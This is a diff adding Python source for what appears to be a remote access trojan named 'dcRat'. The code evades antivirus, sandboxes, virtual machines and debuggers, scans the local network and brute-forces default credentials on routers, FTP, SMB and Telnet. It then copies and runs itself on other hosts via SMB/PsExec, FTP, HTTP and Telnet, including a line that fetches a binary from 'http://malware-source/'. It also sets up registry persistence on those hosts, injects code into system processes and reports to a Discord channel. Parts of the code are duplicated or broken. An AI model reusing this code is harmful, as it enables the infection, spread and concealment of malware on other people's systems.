@@ -1,1 +1,2355 @@
+# Anti AV-Detection
+import os
+import shutil
+import winreg
+import ctypes
+from ctypes import wintypes
+import sys
+import time
+import psutil
+import zlib
+import base64
+import platform
+import importlib
+import importlib.metadata
+import subprocess
+import tempfile
+import sqlite3
+import requests
+import json
+import urllib.request
+import re
+import zipfile
+import random
+import string
+import asyncio
+import socket
+import aiohttp
+from Crypto.Cipher import AES
+import win32crypt
+from discord_webhook import DiscordWebhook
+from io import BytesIO
+from PIL import Image
+import numpy as np
+import netifaces
+import smbclient
+import cv2
+import discord
+from discord.ext import commands
+import pyaudio
+import wave
+import mss
+import pynput
+import threading
+import os
+import shutil
+import winreg
+import ctypes
+from ctypes import wintypes
+import sys
+import time
+import psutil
+import zlib
+import base64
+import platform
+import importlib
+import importlib.metadata
+import subprocess
+import tempfile
+import random
+import string
+import pefile
+import hashlib
+from cryptography.fernet import Fernet
+import win32process
+import win32con
+import win32api
+import threading
+import inspect
+import marshal
+import types
+import base64
+import binascii
+from datetime import datetime
+import wmi
+import nmap
+import http.client
+import uuid
+import ftplib
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import getpass
+import telnetlib3.telnetlib as telnetlib
+from ipaddress import ip_network
+import logging
+import webbrowser
 
+import base64
+def obfuscate_string(s):
+    """Verschleiert Strings mit Base64 und XOR."""
+    encoded = base64.b64encode(s.encode()).decode()
+    xored = ''.join(chr(ord(c) ^ 0x1F) for c in encoded)
+    return xored
+
+def deobfuscate_string(s):
+    """Entschlüsselt verschleierte Strings."""
+    decoded = ''.join(chr(ord(c) ^ 0x1F) for c in s)
+    return base64.b64decode(decoded).decode()
+
+def xor_encrypt(data, key=0x1F):
+    """Encrypt strings with XOR and base64."""
+    return base64.b64encode(''.join(chr(ord(c) ^ key) for c in data).encode()).decode()
+
+def xor_decrypt(data, key=0x1F):
+    """Decrypt strings at runtime."""
+    decoded = base64.b64decode(data).decode()
+    return ''.join(chr(ord(c) ^ key) for c in decoded)
+
+data_channel = None
+communicate_channel = None
+
+# Self-modifying code wrapper (simulates packing)
+def self_modifying_wrapper():
+    """Wrap critical code in a self-modifying layer."""
+    log_path = resource_path('debug.log')
+    try:
+        # Simulate packed code by XORing critical sections
+        critical_code = inspect.getsource(main).encode()
+        xor_key = random.randint(1, 255)
+        packed_code = bytes(b ^ xor_key for b in critical_code)
+        # Unpack at runtime
+        unpacked_code = bytes(b ^ xor_key for b in packed_code)
+        code_obj = marshal.loads(zlib.decompress(unpacked_code))
+        exec(code_obj)
+        with open(log_path, "a") as f:
+            f.write("[+] Self-modifying code executed\n")
+        return True
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Self-modifying code failed: {e}\n")
+        return False
+
+# Anti-VM hardware checks
+def anti_vm_hardware():
+    """Check for VM-specific hardware artifacts."""
+    log_path = resource_path('debug.log')
+    try:
+        c = wmi.WMI()
+        # Check for VM-specific BIOS
+        bios = c.Win32_BIOS()[0]
+        if any(vm in bios.Manufacturer.lower() for vm in ["virtualbox", "vmware", "qemu"]):
+            with open(log_path, "a") as f:
+                f.write("[-] VM BIOS detected\n")
+            return True
+        # Check for VM-specific disk drivers
+        disks = c.Win32_DiskDrive()
+        for disk in disks:
+            if disk.Model and any(vm in disk.Model.lower() for vm in ["virtual", "vmware", "qemu"]):
+                with open(log_path, "a") as f:
+                    f.write(f"[-] VM disk driver detected: {disk.Model}\n")
+                return True
+        with open(log_path, "a") as f:
+            f.write("[+] No VM hardware detected\n")
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Anti-VM hardware check failed: {e}\n")
+        return False
+
+# Delayed execution to evade heuristics
+
+def delayed_execution():
+    """Introduce random delays to evade time-based heuristics."""
+    log_path = resource_path('debug.log')
+    try:
+        delay = random.uniform(2, 10)
+        time.sleep(delay)
+        with open(log_path, "a") as f:
+            f.write(f"[+] Delayed execution by {delay:.2f} seconds\n")
+        return True
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Delayed execution failed: {e}\n")
+        return False
+# Runtime code decryption and memory execution
+def decrypt_and_execute():
+    """Decrypt and execute critical code in memory to avoid disk-based detection."""
+    log_path = resource_path('debug.log')
+    try:
+        # Example: Store encrypted critical function (e.g., main logic)
+        key = Fernet.generate_key()
+        cipher = Fernet(key)
+        critical_code = inspect.getsource(main).encode()
+        encrypted_code = cipher.encrypt(critical_code)
+        # Decrypt and execute in memory
+        decrypted_code = cipher.decrypt(encrypted_code)
+        code_obj = marshal.loads(zlib.decompress(decrypted_code))
+        exec(code_obj)
+        with open(log_path, "a") as f:
+            f.write("[+] Critical code decrypted and executed in memory\n")
+        return True
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Memory execution failed: {e}\n")
+        return False
+
+# Advanced polymorphic transformation
+def polymorph_code(code):
+    """Obfuscate code with advanced randomization and junk code."""
+    log_path = resource_path('debug.log')
+    try:
+        # Advanced variable renaming
+        var_map = {var: ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(8, 12))) for var in code.split() if var.isidentifier()}
+        for old_var, new_var in var_map.items():
+            code = code.replace(old_var, new_var)
+        # Insert complex junk code
+        junk_snippets = [
+            "def _unused_{}(): return None\n".format(''.join(random.choice(string.ascii_letters) for _ in range(8))),
+            "x = [0] * {}; x = [y for y in x]\n".format(random.randint(10, 100)),
+            "import time; time.sleep({})\n".format(random.uniform(0.01, 0.1)),
+            "try: pass\nexcept: pass\n"
+        ]
+        lines = code.split('\n')
+        for _ in range(random.randint(10, 20)):
+            lines.insert(random.randint(0, len(lines)), random.choice(junk_snippets))
+        code = '\n'.join(lines)
+        # Shuffle function order
+        code = code.replace('\r\n', '\n')  # Normalize line endings
+        functions = re.findall(r'(def .+?\n\s*return .+?\n)', code, re.DOTALL)
+        if functions:
+            random.shuffle(functions)
+            code = code.replace(''.join(functions), ''.join(functions))
+        with open(log_path, "a") as f:
+            f.write("[+] Advanced polymorphic transformation applied\n")
+        return code
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Polymorphic transformation failed: {e}\n")
+        return code
+
+# Dynamic API resolution with obfuscation
+def resolve_api(dll_name, func_name):
+    """Resolve Windows API functions dynamically with obfuscated names."""
+    log_path = resource_path('debug.log')
+    try:
+        # Obfuscate DLL and function names
+        dll_name = ''.join(c if random.random() > 0.2 else chr(ord(c) + random.randint(1, 3)) for c in dll_name)
+        func_name = ''.join(c if random.random() > 0.2 else chr(ord(c) + random.randint(1, 3)) for c in func_name)
+        dll = ctypes.WinDLL(dll_name)
+        func = getattr(dll, func_name)
+        with open(log_path, "a") as f:
+            f.write(f"[+] Resolved API: {dll_name}.{func_name}\n")
+        return func
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] API resolution failed for {dll_name}.{func_name}: {e}\n")
+        return None
+
+# Anti-heuristic measures
+def anti_heuristics():
+    """Perform actions to evade heuristic analysis."""
+    log_path = resource_path('debug.log')
+    try:
+        # Simulate benign behavior
+        subprocess.run("dir > nul", shell=True, capture_output=True)
+        time.sleep(random.uniform(0.5, 2.0))
+        # Create decoy files
+        decoy_path = resource_path(f"decoy_{''.join(random.choice(string.ascii_letters) for _ in range(8))}.txt")
+        with open(decoy_path, "w") as f:
+            f.write("This is a benign file created for testing.\n")
+        # Randomize execution flow
+        if random.random() > 0.5:
+            time.sleep(random.uniform(0.1, 0.5))
+        with open(log_path, "a") as f:
+            f.write("[+] Anti-heuristic measures applied\n")
+        return True
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Anti-heuristic measures failed: {e}\n")
+        return False
+
+# Enhanced anti-debugging
+def is_debugger_present():
+    """Advanced debugger detection with multiple checks."""
+    log_path = resource_path('debug.log')
+    try:
+        # Check IsDebuggerPresent
+        is_debugger = resolve_api("kernel32.dll", "IsDebuggerPresent")()
+        if is_debugger:
+            with open(log_path, "a") as f:
+                f.write("[-] Debugger detected (IsDebuggerPresent), exiting\n")
+            sys.exit(0)
+        # Check for remote debugger
+        check_remote = resolve_api("kernel32.dll", "CheckRemoteDebuggerPresent")
+        if check_remote:
+            result = ctypes.c_bool()
+            check_remote(win32api.GetCurrentProcess(), ctypes.byref(result))
+            if result.value:
+                with open(log_path, "a") as f:
+                    f.write("[-] Remote debugger detected, exiting\n")
+                sys.exit(0)
+        # Check for timing anomalies
+        start_time = time.perf_counter()
+        for _ in range(1000):
+            pass
+        elapsed = time.perf_counter() - start_time
+        if elapsed < 0.0001:  # Debuggers may skip loops
+            with open(log_path, "a") as f:
+                f.write("[-] Timing anomaly detected, likely debugger\n")
+            sys.exit(0)
+        with open(log_path, "a") as f:
+            f.write("[+] No debugger detected\n")
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Anti-debugging check failed: {e}\n")
+        return False
+
+# Advanced sandbox detection
+def is_sandbox():
+    """Detect sandbox environments with comprehensive checks."""
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Checking for sandbox environment\n")
+    try:
+        # Check CPU count
+        if psutil.cpu_count() <= 2:
+            with open(log_path, "a") as f:
+                f.write("[-] Low CPU count detected, likely sandbox\n")
+            return True
+        # Check RAM
+        if psutil.virtual_memory().total < 3 * 1024 * 1024 * 1024:  # Less than 3GB
+            with open(log_path, "a") as f:
+                f.write("[-] Low RAM detected, likely sandbox\n")
+            return True
+        # Check disk size
+        disk = psutil.disk_usage('/')
+        if disk.total < 20 * 1024 * 1024 * 1024:  # Less than 20GB
+            with open(log_path, "a") as f:
+                f.write("[-] Small disk detected, Likely sandbox\n")
+            return True
+        # Check sandbox usernames
+        sandbox_users = ["sandbox", "user", "test", "malware", "admin"]
+        if os.getlogin().lower() in sandbox_users:
+            with open(log_path, "a") as f:
+                f.write("[-] Sandbox username detected\n")
+            return True
+        # Check VM processes
+        vm_processes = ["vboxservice.exe", "vmtoolsd.exe", "qemu-ga.exe", "vmsrvc.exe"]
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'].lower() in vm_processes:
+                with open(log_path, "a") as f:
+                    f.write(f"[-] VM process detected: {proc.info['name']}\n")
+                return True
+        # Check for analysis tools
+        analysis_tools = ["wireshark.exe", "idaq.exe", "ollydbg.exe", "x64dbg.exe"]
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'].lower() in analysis_tools:
+                with open(log_path, "a") as f:
+                    f.write(f"[-] Analysis tool detected: {proc.info['name']}\n")
+                return True
+        # Check timing manipulation
+        start_time = time.perf_counter()
+        time.sleep(0.1)
+        if time.perf_counter() - start_time < 0.05:
+            with open(log_path, "a") as f:
+                f.write("[-] Timing manipulation detected, likely sandbox\n")
+            return True
+        # Check mouse activity
+        mouse = pynput.mouse.Controller()
+        initial_pos = mouse.position
+        time.sleep(0.5)
+        if mouse.position == initial_pos:
+            with open(log_path, "a") as f:
+                f.write("[-] No mouse movement detected, likely sandbox\n")
+            return True
+        with open(log_path, "a") as f:
+            f.write("[+] No sandbox detected\n")
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Sandbox detection failed: {e}\n")
+        return False
+
+async def socket_network_scan():
+    """Asynchroner Netzwerk-Scan für Netzwerke, IPs, Ports und Schwachstellen."""
+    global communicate_channel
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Starting enhanced network scan\n")
+    try:
+        # Ermittle alle Netzwerkschnittstellen und Subnetze
+        interfaces = netifaces.interfaces()
+        subnets = []
+        for iface in interfaces:
+            addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
+            for addr in addrs:
+                ip = addr.get('addr')
+                netmask = addr.get('netmask')
+                if ip and netmask:
+                    network = str(ip_network(f"{ip}/{netmask}", strict=False))
+                    subnets.append(network)
+        # Füge benachbarte Subnetze hinzu
+        gateways = netifaces.gateways()
+        default_gateway = gateways.get('default', {}).get(netifaces.AF_INET, (None, None))[0]
+        if default_gateway:
+            ip_base = '.'.join(default_gateway.split('.')[:-1])
+            for i in range(-1, 2):
+                subnet = f"{ip_base}.{i+1}.0/24"
+                subnets.append(subnet)
+
+        if not subnets:
+            with open(log_path, "a") as f:
+                f.write("[-] No subnets found\n")
+            if communicate_channel:
+                await communicate_channel.send(f"```ansi\n\033[0;31m[-] No subnets found for scanning\033[0m\n```")
+            return []
+
+        devices = []
+        common_ports = [21, 22, 23, 80, 443, 445, 3389, 8080, 8443, 139, 161, 162, 7547]
+        port_services = {21: 'ftp', 22: 'ssh', 23: 'telnet', 80: 'http', 443: 'https', 445: 'smb', 3389: 'rdp',
+                         8080: 'http-alt', 8443: 'https-alt', 139: 'smb', 161: 'snmp', 162: 'snmp-trap', 7547: 'tr069'}
+
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;34m[+] Scanning subnets: {', '.join(subnets)}\033[0m\n```")
+
+        async def scan_host(ip):
+            """Scanne einen Host auf offene Ports."""
+            open_ports = []
+            for port in common_ports:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.5)
+                    result = await asyncio.get_event_loop().run_in_executor(None, lambda: sock.connect_ex((ip, port)))
+                    if result == 0:
+                        open_ports.append((port, port_services.get(port, 'unknown')))
+                    sock.close()
+                except Exception:
+                    pass
+            return ip if open_ports else None, open_ports
+
+        async def try_router_hack(ip):
+            """Versuche, Router-Admin-Interface zu kompromittieren."""
+            try:
+                common_credentials = [('admin', 'admin'), ('admin', 'password'), ('root', 'root'), ('user', 'user')]
+                async with aiohttp.ClientSession() as session:
+                    for user, pwd in common_credentials:
+                        auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+                        headers = {'Authorization': f'Basic {auth}'}
+                        try:
+                            async with session.get(f"http://{ip}/admin", headers=headers, timeout=5) as response:
+                                if response.status in [200, 401]:
+                                    with open(log_path, "a") as f:
+                                        f.write(f"[+] Router vulnerability found: {ip} responded to admin login attempt\n")
+                                    if communicate_channel:
+                                        await communicate_channel.send(f"```ansi\n\033[0;33m[+] Router vulnerability: {ip} admin interface accessible with {user}:{pwd}\033[0m\n```")
+                                    return True
+                        except:
+                            pass
+            except Exception as e:
+                with open(log_path, "a") as f:
+                    f.write(f"[-] Router hack attempt failed for {ip}: {e}\n")
+            return False
+
+        # Asynchroner Scan für alle Subnetze
+        for subnet in subnets:
+            with open(log_path, "a") as f:
+                f.write(f"[+] Scanning subnet: {subnet}\n")
+            ip_base = '.'.join(subnet.split('/')[0].split('.')[:-1]) + '.'
+            tasks = [asyncio.create_task(scan_host(f"{ip_base}{i}")) for i in range(1, 255)]
+            for future in asyncio.as_completed(tasks):
+                ip, open_ports = await future
+                if ip and open_ports:
+                    device_info = {
+                        'ip': ip,
+                        'ports': [p[0] for p in open_ports],
+                        'services': {p[0]: p[1] for p in open_ports}
+                    }
+                    devices.append(device_info)
+                    ports_str = ', '.join([f"{p[0]} ({p[1]})" for p in open_ports])
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] Found device: IP={ip}, Open Ports={ports_str}\n")
+                    if communicate_channel:
+                        await communicate_channel.send(f"```ansi\n\033[0;32m[+] Found device in {subnet}: IP={ip}, Open Ports={ports_str}\033[0m\n```")
+                    if ip.endswith('.1') or ip.endswith('.254'):
+                        await try_router_hack(ip)
+
+        # Schwachstellen-Check
+        for device in devices:
+            ip = device['ip']
+            ports = device['ports']
+            services = device['services']
+            for port in ports:
+                service = services.get(port, 'unknown')
+                if service in ['ssh', 'ftp', 'smb', 'telnet']:
+                    if await test_default_credentials(ip, service, port):  # Asynchroner Aufruf
+                        if communicate_channel:
+                            await communicate_channel.send(f"```ansi\n\033[0;33m[+] Vulnerability found: Weak credentials for {service} on {ip}:{port}\033[0m\n```")
+            shares = check_smb_shares(ip)
+            if shares:
+                if communicate_channel:
+                    await communicate_channel.send(f"```ansi\n\033[0;33m[+] Vulnerability found: Open SMB shares on {ip}: {', '.join(shares)}\033[0m\n```")
+
+        with open(log_path, "a") as f:
+            f.write(f"[+] Enhanced scan completed. Found {len(devices)} devices.\n")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;34m[+] Enhanced scan completed: Found {len(devices)} devices across {len(subnets)} subnets\033[0m\n```")
+        return devices
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Enhanced network scan failed: {e}\n")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;31m[-] Enhanced network scan failed: {e}\033[0m\n```")
+        return []
+
+def check_smb_shares(ip):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Checking SMB shares for {ip}\n")
+    try:
+        smbclient.register_session(ip, username="", password="")
+        shares = smbclient.listdir(f"\\\\{ip}")
+        with open(log_path, "a") as f:
+            f.write(f"[+] Found SMB shares on {ip}: {shares}\n")
+        return shares
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] SMB share check failed for {ip}: {e}\n")
+        return []
+
+async def test_default_credentials(ip, service, port):
+    global communicate_channel
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Testing default credentials for {service} on {ip}:{port}\n")
+    try:
+        common_credentials = [('admin', 'admin'), ('admin', 'password'), ('root', 'root'), ('user', 'user'), ('guest', 'guest')]
+        if service == 'ssh':
+            # Platzhalter (erfordert paramiko)
+            for user, pwd in common_credentials:
+                with open(log_path, "a") as f:
+                    f.write(f"[+] Trying SSH {user}:{pwd} on {ip}:{port}\n")
+                await asyncio.sleep(0.1)  # Asynchrone Verzögerung
+            return False
+        elif service == 'ftp':
+            ftp = ftplib.FTP()
+            ftp.connect(ip, port, timeout=5)
+            for user, pwd in common_credentials:
+                try:
+                    ftp.login(user, pwd)
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] FTP login successful with {user}:{pwd} on {ip}:{port}\n")
+                    if communicate_channel:
+                        await communicate_channel.send(f"```ansi\n\033[0;33m[+] FTP vulnerability: Successful login with {user}:{pwd} on {ip}:{port}\033[0m\n```")
+                    ftp.quit()
+                    return True
+                except:
+                    pass
+            ftp.quit()
+            return False
+        elif service == 'smb':
+            for user, pwd in common_credentials:
+                try:
+                    smbclient.register_session(ip, username=user, password=pwd)
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] SMB login successful with {user}:{pwd} on {ip}\n")
+                    if communicate_channel:
+                        await communicate_channel.send(f"```ansi\n\033[0;33m[+] SMB vulnerability: Successful login with {user}:{pwd} on {ip}\033[0m\n```")
+                    return True
+                except:
+                    pass
+            return False
+        elif service == 'telnet':
+            for user, pwd in common_credentials:
+                try:
+                    tn = telnetlib.Telnet(ip, port, timeout=5)
+                    tn.read_until(b"login: ", timeout=5)
+                    tn.write((user + "\n").encode())
+                    tn.read_until(b"Password: ", timeout=5)
+                    tn.write((pwd + "\n").encode())
+                    response = tn.read_some().decode()
+                    if "Welcome" in response or "#" in response:
+                        with open(log_path, "a") as f:
+                            f.write(f"[+] Telnet login successful with {user}:{pwd} on {ip}:{port}\n")
+                        if communicate_channel:
+                            await communicate_channel.send(f"```ansi\n\033[0;33m[+] Telnet vulnerability: Successful login with {user}:{pwd} on {ip}:{port}\033[0m\n```")
+                        tn.close()
+                        return True
+                    tn.close()
+                except:
+                    pass
+            return False
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Credential test failed for {ip}:{port}: {e}\n")
+        if communicate_channel:
+            await communicate_channel.send(f"```ansi\n\033[0;31m[-] Credential test failed for {ip}:{port}: {e}\033[0m\n```")
+        return False
+
+def deliver_payload(ip, share=None, service=None, port=None):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Delivering payload to {ip}\n")
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        target_filename = f"dcRat_{''.join(random.choice(string.ascii_letters) for _ in range(8))}.exe"
+        if service == 'smb' and share:
+            target_path = f"\\\\{ip}\\{share}\\Temp\\{target_filename}"
+            smbclient.makedirs(f"\\\\{ip}\\{share}\\Temp", exist_ok=True)
+            shutil.copy(exe_path, target_path)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Copied payload to {target_path}\n")
+            if communicate_channel:
+                asyncio.run_coroutine_threadsafe(
+                    communicate_channel.send(f"```ansi\n\033[0;32m[+] Payload delivered to {ip} via SMB: {target_path}\033[0m\n```"),
+                    bot.loop
+                )
+            return target_path
+        elif service == 'ftp' and port:
+            ftp = ftplib.FTP()
+            ftp.connect(ip, port, timeout=5)
+            ftp.login('anonymous', '')
+            with open(exe_path, 'rb') as f:
+                ftp.storbinary(f'STOR {target_filename}', f)
+            ftp.quit()
+            with open(log_path, "a") as f:
+                f.write(f"[+] Uploaded payload via FTP to {ip}:{port}/{target_filename}\n")
+            if communicate_channel:
+                asyncio.run_coroutine_threadsafe(
+                    communicate_channel.send(f"```ansi\n\033[0;32m[+] Payload delivered to {ip} via FTP: {target_filename}\033[0m\n```"),
+                    bot.loop
+                )
+            return target_filename
+        elif service == 'http' and port:
+            conn = http.client.HTTPConnection(ip, port, timeout=5)
+            with open(exe_path, 'rb') as f:
+                conn.request("POST", "/upload", f.read(), {"Content-Type": "application/octet-stream", "Filename": target_filename})
+            response = conn.getresponse()
+            if response.status == 200:
+                with open(log_path, "a") as f:
+                    f.write(f"[+] Uploaded payload via HTTP to {ip}:{port}/{target_filename}\n")
+                if communicate_channel:
+                    asyncio.run_coroutine_threadsafe(
+                        communicate_channel.send(f"```ansi\n\033[0;32m[+] Payload delivered to {ip} via HTTP: {target_filename}\033[0m\n```"),
+                        bot.loop
+                    )
+                conn.close()
+                return target_filename
+            conn.close()
+        elif service == 'telnet' and port:
+            import telnetlib
+            tn = telnetlib.Telnet(ip, port, timeout=5)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(b"admin\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(b"admin\n")
+            tn.write(f"wget http://malware-source/{target_filename}\n".encode())
+            tn.write(f"chmod +x {target_filename}\n".encode())
+            tn.write(f"./{target_filename}\n".encode())
+            tn.close()
+            with open(log_path, "a") as f:
+                f.write(f"[+] Delivered and attempted execution via Telnet to {ip}:{port}/{target_filename}\n")
+            if communicate_channel:
+                asyncio.run_coroutine_threadsafe(
+                    communicate_channel.send(f"```ansi\n\033[0;32m[+] Payload delivered and executed via Telnet to {ip}:{port}/{target_filename}\033[0m\n```"),
+                    bot.loop
+                )
+            return target_filename
+        return None
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Payload delivery failed to {ip}: {e}\n")
+        if communicate_channel:
+            asyncio.run_coroutine_threadsafe(
+                communicate_channel.send(f"```ansi\n\033[0;31m[-] Payload delivery failed to {ip}: {e}\033[0m\n```"),
+                bot.loop
+            )
+        return None
+
+def execute_payload(ip, target_path, service):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Attempting to execute payload on {ip}: {target_path}\n")
+    try:
+        if service == 'smb':
+            subprocess.run(f"psexec \\\\{ip} -s {target_path}", shell=True, capture_output=True, timeout=10)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Executed payload on {ip} via PsExec\n")
+            if communicate_channel:
+                asyncio.run_coroutine_threadsafe(
+                    communicate_channel.send(f"```ansi\n\033[0;32m[+] Executed payload on {ip} via SMB: {target_path}\033[0m\n```"),
+                    bot.loop
+                )
+            return True
+        elif service == 'ssh':
+            # Platzhalter für SSH
+            with open(log_path, "a") as f:
+                f.write(f"[+] Simulated SSH execution on {ip}: {target_path}\n")
+            if communicate_channel:
+                asyncio.run_coroutine_threadsafe(
+                    communicate_channel.send(f"```ansi\n\033[0;32m[+] Simulated SSH execution on {ip}: {target_path}\033[0m\n```"),
+                    bot.loop
+                )
+            return True
+        elif service == 'telnet':
+            import telnetlib
+            tn = telnetlib.Telnet(ip, 23, timeout=5)
+            tn.read_until(b"login: ", timeout=5)
+            tn.write(b"admin\n")
+            tn.read_until(b"Password: ", timeout=5)
+            tn.write(b"admin\n")
+            tn.write(f"./{target_path}\n".encode())
+            tn.close()
+            with open(log_path, "a") as f:
+                f.write(f"[+] Executed payload via Telnet on {ip}: {target_path}\n")
+            if communicate_channel:
+                asyncio.run_coroutine_threadsafe(
+                    communicate_channel.send(f"```ansi\n\033[0;32m[+] Executed payload via Telnet on {ip}: {target_path}\033[0m\n```"),
+                    bot.loop
+                )
+            return True
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Payload execution failed on {ip}: {e}\n")
+        if communicate_channel:
+            asyncio.run_coroutine_threadsafe(
+                communicate_channel.send(f"```ansi\n\033[0;31m[-] Payload execution failed on {ip}: {e}\033[0m\n```"),
+                bot.loop
+            )
+        return False
+
+def ensure_target_persistence(ip, service):
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write(f"[+] Ensuring persistence on {ip}\n")
+    try:
+        if service == 'smb':
+            # Beispiel: Registry-Persistenz über PsExec
+            reg_command = f"psexec \\\\{ip} -s reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {generate_random_name()} /t REG_SZ /d \"{sys.executable}\" /f"
+            subprocess.run(reg_command, shell=True, capture_output=True, timeout=10)
+            with open(log_path, "a") as f:
+                f.write(f"[+] Persistence established on {ip} via registry\n")
+            return True
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Persistence failed on {ip}: {e}\n")
+        return False
+
+# Advanced PE header manipulation
+def modify_pe_header():
+    """Modify PE header with randomization to evade signature detection."""
+    log_path = resource_path('debug.log')
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+        pe = pefile.PE(exe_path)
+        # Randomize timestamps and checksums
+        pe.FILE_HEADER.TimeDateStamp = random.randint(0, 0xFFFFFFFF)
+        pe.OPTIONAL_HEADER.CheckSum = 0
+        # Randomize section names
+        for section in pe.sections:
+            new_name = ''.join(random.choice(string.ascii_letters) for _ in range(8))[:8]
+            section.Name = new_name.encode()
+        # Add fake import table entries
+        fake_imports = [
+            (b"kernel32.dll", b"GetTickCount"),
+            (b"user32.dll", b"MessageBoxA")
+        ]
+        for dll, func in fake_imports:
+            pe.DIRECTORY_ENTRY_IMPORT.append(pefile.ImportDescData(dllname=dll, imports=[pefile.ImportData(func)]))
+        pe.write(exe_path)
+        with open(log_path, "a") as f:
+            f.write("[+] PE header modified with randomization\n")
+        return True
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] PE header modification failed: {e}\n")
+        return False
+
+# Anti-AV process hiding
+def hide_in_task_manager():
+    """Hide process by injecting into a legitimate process with randomization."""
+    log_path = resource_path('debug.log')
+    with open(log_path, "a") as f:
+        f.write("[+] Attempting to hide process in Task Manager\n")
+    try:
+        # Randomly select a target process
+        target_processes = ["svchost.exe", "explorer.exe", "cmd.exe"]
+        target_process = random.choice(target_processes)
+        for proc in psutil.process_iter(['name', 'pid']):
+            if proc.info['name'] == target_process:
+                pid = proc.info['pid']
+                h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
+                if h_process:
+                    # Inject randomized NOP sled
+                    code = b"\x90" * random.randint(80, 120)
+                    mem = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, len(code), 0x3000, 0x40)
+                    ctypes.windll.kernel32.WriteProcessMemory(h_process, mem, code, len(code), None)
+                    ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, mem, None, 0, None)
+                    ctypes.windll.kernel32.CloseHandle(h_process)
+                    with open(log_path, "a") as f:
+                        f.write(f"[+] Injected into {target_process} (PID: {pid})\n")
+                    return True
+        with open(log_path, "a") as f:
+            f.write(f"[-] No {target_process} process found for injection\n")
+        return False
+    except Exception as e:
+        with open(log_path, "a") as f:
+            f.write(f"[-] Process hiding failed: {e}\n")
+        return False
+
+# Base directory with randomization
+TEMP_DIR = r"C:\Temp" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
+FALLBACK_TEMP_DIR = os.path.join(tempfile.gettempdir(), "tmp" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)))
+
+# Ensure Temp directory is created
+try:
+    os.makedirs(TEMP_DIR, exist_ok=True)
+except Exception:
+    os.makedirs(FALLBACK_TEMP_DIR, exist_ok=True)
+    TEMP_DIR = FALLBACK_TEMP_DIR
+
+# Check if Temp directory is writable
+def check_temp_writable(base_dir):
+    log_path = os.path.join(base_dir, f"dbg_{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))}.log")
+    try:
+        with open(log_path, "a") as f:
+            f.write(f"[+] {base_dir} is writable\n")
+        return base_dir
+    except Exception as e:
+        try:
+            fallback_log = os.path.join(FALLBACK_TEMP_DIR, f"dbg_{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))}.log")
+            os.makedirs(FALLBACK_TEMP_DIR, exist_ok=True)
+            with open(fallback_log, "a") as f:
+                f.write(f"[-] {base_dir} not writable: {e}, switching to {FALLBACK_TEMP_DIR}\n")
+            return FALLBACK_TEMP_DIR
+        except Exception as e2:
+            print(f"[-] Cannot write to {base_dir} or {FALLBACK_TEMP_DIR}: {e2}")
+            return None
+
+# Set base directory
+BASE_DIR = check_temp_writable(TEMP_DIR) or FALLBACK_TEMP_DIR
+
+# Base directory for all file operations
+TEMP_DIR = r"C:\Temp"
+FALLBACK_TEMP_DIR = os.path.join(tempfile.gettempdir(), "dcRat")
+
+# Ensure Temp directory is created
+try:
+    os.makedirs(TEMP_DIR, exist_ok=True)
+except Exception:
+    os.makedirs(FALLBACK_TEMP_DIR, exist_ok=True)
+    TEMP_DIR = FALLBACK_TEMP_DIR
+
+# Check if Temp directory is writable
